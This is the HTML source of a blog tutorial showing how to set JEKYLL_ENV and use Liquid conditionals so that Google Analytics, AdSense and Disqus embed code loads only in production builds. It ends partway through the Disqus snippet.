&lt;h2 id=&quot;introduction&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#introduction&quot; aria-label=&quot;introduction permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
&lt;p&gt;The main reason I wanted to do enable/disable specific content on my Jekyll blog was to disable Google Adsense content when building and developing my Jekyll powered website. Google Analytics has an option to ignore user-specified IP addresses of development systems, but Google Adsense does not. Therefore, I wanted a simple and quick solution to remove the Google Adsense code from my local build while keeping the code when the website was deployed to GitHub pages. The solution: setting the Jekyll build environment and ignoring specific website content using conditional (if) statements.&lt;/p&gt;
&lt;p&gt;According to the &lt;a href=&quot;https://jekyllrb.com/docs/configuration/environments/&quot;&gt;Jekyll documentation on Environments&lt;/a&gt;, you can configure the arguments given to the &lt;code class=&quot;language-text&quot;&gt;build&lt;/code&gt; or &lt;code class=&quot;language-text&quot;&gt;serve&lt;/code&gt; commands to include the Jekyll environment. When you build or serve a Jekyll website, you can use conditional statements (&lt;code class=&quot;language-text&quot;&gt;if&lt;/code&gt; statements) to enable or disable specific code depending on the environment. Simply put, you can set the Jekyll &lt;em&gt;environment&lt;/em&gt; when building or serving Jekyll to include, or exclude different content in your website. For example, the Jekyll documentation uses the following example:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;liquid&quot;&gt;&lt;pre class=&quot;language-liquid&quot;&gt;&lt;code class=&quot;language-liquid&quot;&gt;&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; jekyll&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;environment &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;production&quot;&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;include&lt;/span&gt; disqus&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;html &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This statement is quite straight-forward. The &lt;code class=&quot;language-text&quot;&gt;jekyll.environment&lt;/code&gt; variable is checked to see if it is equal to &lt;code class=&quot;language-text&quot;&gt;production&lt;/code&gt;… if it is, then the &lt;code class=&quot;language-text&quot;&gt;disqus.html&lt;/code&gt; HTML code is included the generated page. If the environment is not production, the &lt;code class=&quot;language-text&quot;&gt;disqus.html&lt;/code&gt; is simply not included. To put this example into a real-world context: you can enable Disqus comments to only be included on a Jekyll website when the environment is set to production.&lt;/p&gt;
&lt;p&gt;This leaves a major question… &lt;em&gt;How can you set the Jekyll environment?&lt;/em&gt;. There is a variable called &lt;code class=&quot;language-text&quot;&gt;JEKYLL_ENV&lt;/code&gt; that can be set in the build, or serve, command. For example, a common command to build a Jekyll website is:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;jekyll build&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you want to set the Jekyll build environment to production, you can include the &lt;code class=&quot;language-text&quot;&gt;JEKYLL_ENV&lt;/code&gt; variable with the build command, for example:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;JEKYLL_ENV=production jekyll build&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;There are two commonly used values for the &lt;code class=&quot;language-text&quot;&gt;JEKYLL_ENV&lt;/code&gt; variable, which are self-explanatory by the naming convention:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;production&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;development&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;default-jekyll-environment-values&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#default-jekyll-environment-values&quot; aria-label=&quot;default jekyll environment values permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Default Jekyll Environment Values&lt;/h2&gt;
&lt;p&gt;So far we have discussed how to set the Jekyll environment and some basic examples of how it can be used to enable or disable content in your Jekyll-powered website. However, a key consideration is to determine the default Jekyll environment value. &lt;/p&gt;
&lt;p&gt;The official Jekyll documentation states that &lt;strong&gt;the default value for &lt;code class=&quot;language-text&quot;&gt;JEKYLL_ENV&lt;/code&gt; is development&lt;/strong&gt;. So, if you build, or serve, a Jekyll-powered website, the environment value will always be &lt;code class=&quot;language-text&quot;&gt;development&lt;/code&gt;. This means that you have to explicitly set the environment value to &lt;code class=&quot;language-text&quot;&gt;production&lt;/code&gt; if you want to build, or serve, the Jekyll website in production mode.&lt;/p&gt;
&lt;p&gt;However, in some scenarios, you will not have full control over the Jekyll environment value. A great example is GitHub pages, where the default value for &lt;code class=&quot;language-text&quot;&gt;JEKYLL_ENV&lt;/code&gt; is &lt;code class=&quot;language-text&quot;&gt;production&lt;/code&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Lesson learned:&lt;/strong&gt; The default Jekyll environment is &lt;code class=&quot;language-text&quot;&gt;development&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Lesson learned:&lt;/strong&gt; The default Jekyll environment on GitHub pages is &lt;code class=&quot;language-text&quot;&gt;production&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I always like code snippets when reading about some sort of configuration or setting. So I have provided a collection of examples of how to use the Jekyll environment to enable or disable specific website content. I have included an example for Google Analytics, Google Adsense and Disqus Comments.&lt;/p&gt;
&lt;h2 id=&quot;disabling-google-analytics-in-local-jekyll-development&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#disabling-google-analytics-in-local-jekyll-development&quot; aria-label=&quot;disabling google analytics in local jekyll development permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disabling Google Analytics in Local Jekyll Development&lt;/h2&gt;
&lt;p&gt;Although you can disable Google Analytics data collection from specific IP addresses, it still makes sense to disable the service on your development build. For example, you may have a dynamic IP address from your ISP, or you may develop your website from multiple locations and it can become cumbersome to add numerous IPs to the Analytics filter. The code below displays an example of how to enable Google Analytics only on the production environment.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;liquid&quot;&gt;&lt;pre class=&quot;language-liquid&quot;&gt;&lt;code class=&quot;language-liquid&quot;&gt;&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; jekyll&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;environment &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;production&quot;&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;text/javascript&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;span class=&quot;token language-javascript&quot;&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;i&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;g&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;m&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;GoogleAnalyticsObject&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;q&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;q&lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;arguments&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;l&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;a&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  m&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementsByTagName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;async&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;src&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;g&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parentNode&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;insertBefore&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;m&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;window&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;document&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;script&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;//www.google-analytics.com/analytics.js&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;ga&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;ga&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;create&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;UA-000000-1&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;auto&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;ga&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;send&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;pageview&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In the above example, not how we place the entire Google Analytics script inside the Liquid &lt;code class=&quot;language-text&quot;&gt;if&lt;/code&gt; statement. This script will only be included when the environment is set to production.&lt;/p&gt;
&lt;h2 id=&quot;disabling-google-adsense-in-local-jekyll-development&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#disabling-google-adsense-in-local-jekyll-development&quot; aria-label=&quot;disabling google adsense in local jekyll development permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disabling Google Adsense in Local Jekyll Development&lt;/h2&gt;
&lt;p&gt;Disabling Google Adsense is where setting the Jekyll environment really shines. There are no configuration options available in Adsense to turn off tracking/monitoring on local builds, or no option to disable specific IP addresses of development systems. The code snippet below illustrates pretty much the same solution as seen in the previous example used for disabling Google Analytics.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;liquid&quot;&gt;&lt;pre class=&quot;language-liquid&quot;&gt;&lt;code class=&quot;language-liquid&quot;&gt;&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; jekyll&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;environment &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;production&quot;&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;span class=&quot;token language-javascript&quot;&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;adsbygoogle &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;adsbygoogle &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    google_ad_client&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;ca-pub-0000000000000000&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    enable_page_level_ads&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;disabling-disqus-comments-in-local-jekyll-development&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#disabling-disqus-comments-in-local-jekyll-development&quot; aria-label=&quot;disabling disqus comments in local jekyll development permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disabling Disqus Comments in Local Jekyll Development&lt;/h2&gt;
&lt;p&gt;Again, we can see a very similar solution to disabling Disqus comments in a development build environment. However, I do not find this as useful, as there is no real negative effect to loading Disqus comments of a non-production environment. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;liquid&quot;&gt;&lt;pre class=&quot;language-liquid&quot;&gt;&lt;code class=&quot;language-liquid&quot;&gt;&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; jekyll&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;environment &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;production&quot;&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;text/javascript&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;span class=&quot;token language-javascript&quot;&gt;
  &lt;span class=&quot;token comment&quot;&gt;/* * * CONFIGURATION VARIABLES * * */&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; disqus_shortname &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;websiteshortname&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
